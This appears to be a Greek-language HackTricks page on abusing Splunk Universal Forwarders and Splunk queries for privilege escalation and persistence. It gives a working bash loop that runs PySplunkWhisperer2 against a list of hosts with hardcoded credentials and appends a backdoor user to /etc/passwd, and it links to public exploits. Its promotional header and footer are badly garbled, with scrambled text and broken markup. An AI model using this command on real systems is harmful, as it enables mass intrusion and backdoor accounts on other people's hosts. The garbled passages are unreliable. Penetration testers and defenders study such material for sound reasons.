# Splunk LPE and Persistence

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

Αν **καταμετράτε** μια μηχανή **εσωτερικά** ή **εξωτερικά** και βρείτε **το Splunk να τρέχει** (θύρα 8090), αν τυχαίνει να γνωρίζετε οποιαδήποτε **έγκυρα διαπιστευτήρια** μπορείτε να **καταχραστείτε την υπηρεσία Splunk** για να **εκτελέσετε ένα shell** ως ο χρήστης που τρέχει το Splunk. Αν το τρέχει ο root, μπορείτε να κερδίσετε δικαιώματα root.

Επίσης, αν είστε **ήδη root και η υπηρεσία Splunk δεν ακούει μόνο στο localhost**, μπορείτε να **κλέψετε** το **αρχείο** κωδικών **από** την υπηρεσία Splunk και να **σπάσετε** τους κωδικούς, ή να **προσθέσετε νέα** διαπιστευτήρια σε αυτό. Και να διατηρήσετε την επιμονή στον host.

Στην πρώτη εικόνα παρακάτω μπορείτε να δείτε πώς φαίνεται μια σελίδα web του Splunkd.



## Splunk Universal Forwarder Agent Exploit Summary

Για περισσότερες λεπτομέρειες ελέγξτε την ανάρτηση [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Αυτό είναι απλώς μια σύνοψη:

**Exploit Overview:**
Μια εκμετάλλευση που στοχεύει τον Splunk Universal Forwarder Agent (UF) επιτρέπει στους επιτιθέμενους με τον κωδικό πρόσβασης του agent να εκτελούν αυθαίρετο κώδικα σε συστήματα που τρέχουν τον agent, ενδεχομένως να διακυβεύσουν ολόκληρο το δίκτυο.

**Key Points:**
- Ο agent UF δεν επικυρώνει τις εισερχόμενες συνδέσεις ή την αυθεντικότητα του κώδικα, καθιστώντας τον ευάλωτο σε μη εξουσιοδοτημένη εκτέλεση κώδικα.
- Κοινές μέθοδοι απόκτησης κωδικών περιλαμβάνουν την τοποθέτησή τους σε καταλόγους δικτύου, κοινές χρήσεις αρχείων ή εσωτερική τεκμηρίωση.
- Η επιτυχής εκμετάλλευση μπορεί να οδηγήσει σε πρόσβαση σε επίπεδο SYSTEM ή root σε διακυβευμένους hosts, εξαγωγή δεδομένων και περαιτέρω διείσδυση στο δίκτυο.

**Exploit Execution:**
1. Ο επιτιθέμενος αποκτά τον κωδικό πρόσβασης του agent UF.
2. Χρησιμοποιεί το API του Splunk για να στείλει εντολές ή σενάρια στους agents.
3. Πιθανές ενέργειες περιλαμβάνουν εξαγωγή αρχείων, χειρισμό λογαριασμών χρηστών και διακυβέρνηση συστήματος.

**Impact:**
- Πλήρης διακυβέρνηση του δικτύου με δικαιώματα SYSTEM/root σε κάθε host.
- Πιθανότητα απενεργοποίησης της καταγραφής για να αποφευχθεί η ανίχνευση.
- Εγκατάσταση backdoors ή ransomware.

**Example Command for Exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Χρήσιμα δημόσια exploits:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Κατάχρηση Ερωτημάτων Splunk

**Για περισσότερες λεπτομέρειες ελέγξτε την ανάρτηση [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
